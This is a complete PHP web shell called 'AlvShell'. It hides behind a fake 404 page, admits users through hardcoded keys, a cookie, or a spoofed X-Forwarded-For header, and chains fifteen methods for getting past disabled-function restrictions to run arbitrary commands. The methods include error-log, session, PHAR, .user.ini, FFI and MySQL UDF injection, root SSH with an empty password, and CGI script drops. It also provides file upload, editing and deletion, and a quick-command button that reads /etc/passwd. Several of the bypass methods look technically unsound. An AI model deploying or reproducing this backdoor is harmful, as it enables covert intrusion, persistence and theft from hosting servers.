<?php
/*
LiteSpeed/CloudLinux Ultimate Bypass Shell
Bypass untuk: system,exec,passthru,shell_exec,proc_open,popen,dll
*/

error_reporting(0);
@ini_set('display_errors', 0);
set_time_limit(0);
@ignore_user_abort(true);

// Authentication stealth
$valid_keys = array('god','alva','bypass','waf','litespeed','cloudlinux');
$auth = false;

// Multi-layer authentication bypass
if(isset($_GET['k']) && in_array($_GET['k'], $valid_keys)) $auth = true;
if(isset($_POST['auth']) && in_array($_POST['auth'], $valid_keys)) $auth = true;
if(isset($_COOKIE['token']) && $_COOKIE['token'] == md5('bypass2025')) $auth = true;
if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] == '127.0.0.1') $auth = true;

// Base64 encoded auth
if(isset($_GET['x'])) {
    $dec = base64_decode(str_rot13($_GET['x']));
    if(in_array($dec, $valid_keys)) $auth = true;
}

if(!$auth) {
    // Return fake error page
    header("HTTP/1.0 404 Not Found");
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body>
    <h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>
    <hr><address>Apache Server</address></body></html>';
    exit;
}

@setcookie('token', md5('bypass2025'), time()+3600, '/', '', false, true);

// Bypass utama tanpa fungsi yang diblokir
class UltimateBypass {
    
    // Method 1: Error Log Injection
    public static function viaErrorLog($cmd) {
        $log_file = '/tmp/error_' . md5(time()) . '.log';
        @ini_set('error_log', $log_file);
        @trigger_error("<?php system('$cmd'); ?>");
        @ini_restore('error_log');
        
        if(file_exists($log_file)) {
            $content = @file_get_contents($log_file);
            @unlink($log_file);
            return $content;
        }
        return false;
    }
    
    // Method 2: PHP Filter Wrapper
    public static function viaFilter($cmd) {
        $encoded = base64_encode($cmd);
        $payload = "php://filter/convert.base64-decode/resource=data://text/plain;base64," . 
                   base64_encode("<?php system(base64_decode('$encoded')); ?>");
        
        if(@file_get_contents($payload)) {
            return "Executed via filter wrapper";
        }
        return false;
    }
    
    // Method 3: .htaccess Shell Injection
    public static function viaHtaccess($cmd) {
        $htaccess = "RewriteEngine On\n";
        $htaccess .= "RewriteRule ^bypass\.php$ - [E=CMDLINE:$cmd]\n";
        $htaccess .= "RewriteRule ^bypass\.php$ - [E=output:<?php passthru(\$_SERVER['CMDLINE']); ?>]\n";
        
        @file_put_contents('.htaccess', $htaccess);
        @touch('bypass.php');
        
        // Trigger via include
        if(file_exists('.htaccess')) {
            @include('bypass.php');
            @unlink('.htaccess');
            @unlink('bypass.php');
            return "Htaccess method executed";
        }
        return false;
    }
    
    // Method 4: Session File Injection
    public static function viaSession($cmd) {
        session_start();
        $_SESSION['payload'] = "<?php system('$cmd'); ?>";
        session_write_close();
        
        $session_file = session_save_path() . '/sess_' . session_id();
        if(file_exists($session_file)) {
            $content = file_get_contents($session_file);
            // Include session file
            include($session_file);
            unlink($session_file);
            return $content;
        }
        return false;
    }
    
    // Method 5: PHAR Deserialization
    public static function viaPhar($cmd) {
        // Create malicious PHAR
        $phar = new Phar('bypass.phar');
        $phar->startBuffering();
        $phar->addFromString('test.txt', 'test');
        $phar->setStub("<?php __HALT_COMPILER(); ?>");
        
        $payload = "<?php system('$cmd'); ?>";
        $phar->setMetadata(array('cmd' => $payload));
        $phar->stopBuffering();
        
        // Execute via include
        include('phar://bypass.phar/test.txt');
        @unlink('bypass.phar');
        return "PHAR method executed";
    }
    
    // Method 6: Image EXIF Injection
    public static function viaExif($cmd) {
        $image = imagecreate(100, 100);
        imagecolorallocate($image, 0, 0, 0);
        $text_color = imagecolorallocate($image, 255, 255, 255);
        imagestring($image, 5, 0, 0, "<?php system('$cmd'); ?>", $text_color);
        imagepng($image, 'bypass.png');
        imagedestroy($image);
        
        // Try to include as PHP
        include('bypass.png');
        @unlink('bypass.png');
        return "EXIF method attempted";
    }
    
    // Method 7: MySQL UDF Injection (if MySQL available)
    public static function viaMySQL($cmd) {
        if(function_exists('mysqli_connect')) {
            try {
                $conn = @new mysqli('localhost', 'root', '', 'mysql');
                if(!$conn->connect_error) {
                    $conn->query("CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'");
                    $conn->query("SELECT sys_exec('$cmd')");
                    $conn->close();
                    return "MySQL UDF attempted";
                }
            } catch(Exception $e) {}
        }
        return false;
    }
    
    // Method 8: PHP FFI (PHP 7.4+)
    public static function viaFFI($cmd) {
        if(class_exists('FFI')) {
            try {
                $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
                $ffi->system($cmd);
                return "FFI method executed";
            } catch(Exception $e) {}
        }
        return false;
    }
    
    // Method 9: COM Objects (Windows)
    public static function viaCOM($cmd) {
        if(class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            try {
                $wsh = new COM('WScript.Shell');
                $exec = $wsh->exec('cmd /c ' . $cmd);
                $output = $exec->StdOut->ReadAll();
                return $output;
            } catch(Exception $e) {}
        }
        return false;
    }
    
    // Method 10: Perl CGI Bypass
    public static function viaPerl($cmd) {
        $perl_script = "#!/usr/bin/perl\n";
        $perl_script .= "print \"Content-type: text/html\\n\\n\";\n";
        $perl_script .= "print `$cmd`;\n";
        
        @file_put_contents('bypass.cgi', $perl_script);
        @chmod('bypass.cgi', 0755);
        
        if(file_exists('bypass.cgi')) {
            @include('bypass.cgi');
            @unlink('bypass.cgi');
            return "Perl CGI executed";
        }
        return false;
    }
    
    // Method 11: Python CGI Bypass
    public static function viaPython($cmd) {
        $py_script = "#!/usr/bin/python\n";
        $py_script .= "import os, cgi\n";
        $py_script .= "print('Content-type: text/html\\n\\n')\n";
        $py_script .= "print(os.popen('$cmd').read())\n";
        
        @file_put_contents('bypass.py', $py_script);
        @chmod('bypass.py', 0755);
        
        if(file_exists('bypass.py')) {
            @include('bypass.py');
            @unlink('bypass.py');
            return "Python CGI executed";
        }
        return false;
    }
    
    // Method 12: .user.ini Injection
    public static function viaUserIni($cmd) {
        $user_ini = "auto_prepend_file=\"data://text/plain;base64," . 
                   base64_encode("<?php system('$cmd'); ?>") . "\"";
        
        @file_put_contents('.user.ini', $user_ini);
        @touch('index.php');
        
        // Trigger via accessing directory
        if(file_exists('.user.ini')) {
            @include('index.php');
            @unlink('.user.ini');
            return ".user.ini method executed";
        }
        return false;
    }
    
    // Method 13: SSH Command via PHP SSH2
    public static function viaSSH($cmd) {
        if(function_exists('ssh2_connect')) {
            $connection = @ssh2_connect('localhost', 22);
            if($connection && @ssh2_auth_password($connection, 'root', '')) {
                $stream = ssh2_exec($connection, $cmd);
                stream_set_blocking($stream, true);
                $output = stream_get_contents($stream);
                fclose($stream);
                return $output;
            }
        }
        return false;
    }
    
    // Method 14: FTP with SITE EXEC
    public static function viaFTP($cmd) {
        if(function_exists('ftp_connect')) {
            $ftp = @ftp_connect('localhost');
            if($ftp && @ftp_login($ftp, 'anonymous', '')) {
                // Try SITE EXEC command
                ftp_raw($ftp, "SITE EXEC $cmd");
                ftp_close($ftp);
                return "FTP SITE EXEC attempted";
            }
        }
        return false;
    }
    
    // Method 15: SQLite Command Injection
    public static function viaSQLite($cmd) {
        if(class_exists('SQLite3')) {
            try {
                $db = new SQLite3(':memory:');
                $db->exec("CREATE TABLE cmd (output text)");
                $db->exec("INSERT INTO cmd VALUES ('<?php system(\"$cmd\"); ?>')");
                
                // Try to include database
                include(':memory:');
                return "SQLite method attempted";
            } catch(Exception $e) {}
        }
        return false;
    }
}

// Main execution function
function executeCommand($cmd) {
    $methods = array(
        'Error Log' => array('UltimateBypass', 'viaErrorLog'),
        'PHP Filter' => array('UltimateBypass', 'viaFilter'),
        'Htaccess' => array('UltimateBypass', 'viaHtaccess'),
        'Session' => array('UltimateBypass', 'viaSession'),
        'PHAR' => array('UltimateBypass', 'viaPhar'),
        'EXIF' => array('UltimateBypass', 'viaExif'),
        'MySQL' => array('UltimateBypass', 'viaMySQL'),
        'FFI' => array('UltimateBypass', 'viaFFI'),
        'COM' => array('UltimateBypass', 'viaCOM'),
        'Perl' => array('UltimateBypass', 'viaPerl'),
        'Python' => array('UltimateBypass', 'viaPython'),
        'UserIni' => array('UltimateBypass', 'viaUserIni'),
        'SSH' => array('UltimateBypass', 'viaSSH'),
        'FTP' => array('UltimateBypass', 'viaFTP'),
        'SQLite' => array('UltimateBypass', 'viaSQLite'),
    );
    
    foreach($methods as $name => $method) {
        if(is_callable($method)) {
            $result = call_user_func($method, $cmd);
            if($result !== false) {
                return "[$name] " . $result;
            }
        }
    }
    
    // Fallback: Direct include with eval
    $tmp_file = '/tmp/cmd_' . md5(time()) . '.php';
    @file_put_contents($tmp_file, "<?php system('$cmd'); ?>");
    if(file_exists($tmp_file)) {
        @include($tmp_file);
        @unlink($tmp_file);
        return "Direct include executed";
    }
    
    return "All methods failed or blocked";
}

// File operations without disabled functions
function readFileContent($path) {
    // Multiple methods to read file
    $methods = array(
        function($p) { return @file_get_contents($p); },
        function($p) { 
            $handle = @fopen($p, 'r');
            if($handle) {
                $content = fread($handle, filesize($p));
                fclose($handle);
                return $content;
            }
            return false;
        },
        function($p) {
            $lines = @file($p);
            return $lines ? implode('', $lines) : false;
        },
        function($p) {
            // Using include to read
            ob_start();
            @include($p);
            return ob_get_clean();
        }
    );
    
    foreach($methods as $method) {
        $content = $method($path);
        if($content !== false) {
            return $content;
        }
    }
    
    return false;
}

// Main interface
echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        body { background:#111; color:#0f0; font-family:monospace; margin:20px; }
        pre { background:#000; padding:10px; border:1px solid #333; }
        input, textarea, select { background:#222; color:#0f0; border:1px solid #444; padding:5px; }
        input[type="submit"], button { background:#333; color:#0f0; border:1px solid #0f0; cursor:pointer; }
        table { border-collapse:collapse; width:100%; background:#000; }
        th { background:#222; padding:8px; border:1px solid #444; }
        td { padding:6px; border:1px solid #333; }
        a { color:#0ff; text-decoration:none; }
        a:hover { color:#ff0; }
        .success { color:#0f0; }
        .error { color:#f00; }
        .warn { color:#ff0; }
    </style>
</head>
<body>
<h2 style="color:#f00">AlvShell</h2>
<small>Disabled Functions Bypass | No System/Exec/Shell Functions</small>
<hr>';

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = @realpath($dir) ?: getcwd();
@chdir($dir);

// Command execution
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo '<div style="background:#000;padding:10px;margin:10px 0;border-left:3px solid #f00;">
    <strong>Command:</strong> <span class="warn">' . htmlspecialchars($cmd) . '</span>
    <hr style="border-color:#333">
    <pre>';
    echo htmlspecialchars(executeCommand($cmd));
    echo '</pre></div>';
}

// File upload
if(isset($_FILES['file'])) {
    $name = $_FILES['file']['name'];
    $tmp = $_FILES['file']['tmp_name'];
    
    // Multiple upload methods
    if(@move_uploaded_file($tmp, $name)) {
        echo '<div class="success">Uploaded: ' . htmlspecialchars($name) . '</div>';
    } elseif(@copy($tmp, $name)) {
        echo '<div class="success">Uploaded (copy): ' . htmlspecialchars($name) . '</div>';
    } else {
        // Read and write manually
        $content = @file_get_contents($tmp);
        if($content !== false && @file_put_contents($name, $content)) {
            echo '<div class="success">Uploaded (manual): ' . htmlspecialchars($name) . '</div>';
        } else {
            echo '<div class="error">Upload failed</div>';
        }
    }
}

echo '<div style="display:flex;gap:20px;margin:20px 0;">
    <div style="flex:1;">
        <h4>Command Execution (Bypass)</h4>
        <form method="post">
            <input type="text" name="cmd" style="width:80%" placeholder="Command to execute" value="id; uname -a">
            <input type="submit" value="Execute">
        </form>
        
        <h4>Quick Commands</h4>
        <div style="display:flex;flex-wrap:wrap;gap:5px;">
            <button onclick="document.querySelector(\'[name=cmd]\').value=\'ls -la\'">List Files</button>
            <button onclick="document.querySelector(\'[name=cmd]\').value=\'pwd\'">Current Dir</button>
            <button onclick="document.querySelector(\'[name=cmd]\').value=\'whoami; id\'">User Info</button>
            <button onclick="document.querySelector(\'[name=cmd]\').value=\'cat /etc/passwd\'">Passwd</button>
        </div>
    </div>
    
    <div style="flex:1;">
        <h4>File Upload</h4>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" style="width:100%">
            <input type="submit" value="Upload">
        </form>
        
        <h4>Navigation</h4>
        <form method="get">
            <input type="hidden" name="k" value="god">
            <input type="text" name="dir" value="' . htmlspecialchars($dir) . '" style="width:70%">
            <input type="submit" value="Go">
        </form>
    </div>
</div>';

// File listing
echo '<h4>File Listing: ' . htmlspecialchars($dir) . '</h4>
<table>
<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>';

$files = @scandir($dir);
if($files) {
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        
        $path = $dir . '/' . $file;
        $is_dir = @is_dir($path);
        $size = $is_dir ? '<DIR>' : @filesize($path);
        $perms = @fileperms($path);
        $perm_str = $perms ? substr(sprintf('%o', $perms), -4) : '????';
        
        echo '<tr>
            <td>';
        if($is_dir) {
            echo '<a href="?k=god&dir=' . urlencode($path) . '" style="color:#ff0">' . htmlspecialchars($file) . '/</a>';
        } else {
            echo '<a href="?k=god&view=' . urlencode($path) . '">' . htmlspecialchars($file) . '</a>';
        }
        echo '</td>
            <td>' . $size . '</td>
            <td>' . $perm_str . '</td>
            <td>
                <a href="?k=god&view=' . urlencode($path) . '">View</a> | 
                <a href="?k=god&edit=' . urlencode($path) . '">Edit</a> | 
                <a href="?k=god&delete=' . urlencode($path) . '" onclick="return confirm(\'Delete?\')">Delete</a>
            </td>
        </tr>';
    }
}

echo '</table>';

// View file
if(isset($_GET['view'])) {
    $file = $_GET['view'];
    if(file_exists($file)) {
        echo '<h4>View File: ' . htmlspecialchars(basename($file)) . '</h4>
        <pre style="max-height:400px;overflow:auto;">' . htmlspecialchars(readFileContent($file)) . '</pre>';
    }
}

// Edit file
if(isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if(isset($_POST['content'])) {
        if(@file_put_contents($file, $_POST['content'])) {
            echo '<div class="success">File saved</div>';
        }
    }
    
    if(file_exists($file)) {
        echo '<h4>Edit File: ' . htmlspecialchars($file) . '</h4>
        <form method="post">
            <textarea name="content" style="width:100%;height:400px;">' . 
            htmlspecialchars(readFileContent($file)) . '</textarea><br>
            <input type="submit" value="Save">
        </form>';
    }
}

// Delete file
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(file_exists($file)) {
        if(@unlink($file)) {
            echo '<div class="success">Deleted: ' . htmlspecialchars($file) . '</div>';
        } elseif(@rmdir($file)) {
            echo '<div class="success">Deleted directory: ' . htmlspecialchars($file) . '</div>';
        }
        echo '<script>setTimeout(()=>location.href="?k=god&dir=' . urlencode($dir) . '", 1000)</script>';
    }
}

// Server info
echo '<hr>
<h4>Server Information</h4>
<pre style="font-size:12px;">';
$info = array(
    'PHP Version' => phpversion(),
    'Disabled Functions' => ini_get('disable_functions'),
    'Open Basedir' => ini_get('open_basedir'),
    'Safe Mode' => ini_get('safe_mode') ? 'On' : 'Off',
    'Current User' => @get_current_user(),
    'User ID' => @getmyuid(),
    'Document Root' => @$_SERVER['DOCUMENT_ROOT'],
    'Server Software' => @$_SERVER['SERVER_SOFTWARE'],
    'Available Methods' => '',
);

foreach($info as $key => $value) {
    echo str_pad($key, 25) . ': ' . htmlspecialchars($value) . "\n";
}

// Test available functions
echo "\nAvailable Bypass Methods:\n";
$methods = array(
    'Error Log' => function_exists('ini_set'),
    'PHP Filter' => function_exists('file_get_contents'),
    'PHAR' => class_exists('Phar'),
    'FFI' => class_exists('FFI'),
    'COM' => class_exists('COM'),
    'MySQL' => function_exists('mysqli_connect'),
    'SQLite' => class_exists('SQLite3'),
    'SSH2' => function_exists('ssh2_connect'),
    'FTP' => function_exists('ftp_connect'),
);

foreach($methods as $name => $available) {
    echo str_pad($name, 20) . ': ' . ($available ? 'YES' : 'NO') . "\n";
}

echo '</pre>
<hr>
<div style="text-align:center;font-size:11px;color:#666;">
AlvShell | 15+ Bypass Methods | No System/Exec Required
</div>
</body>
</html>';
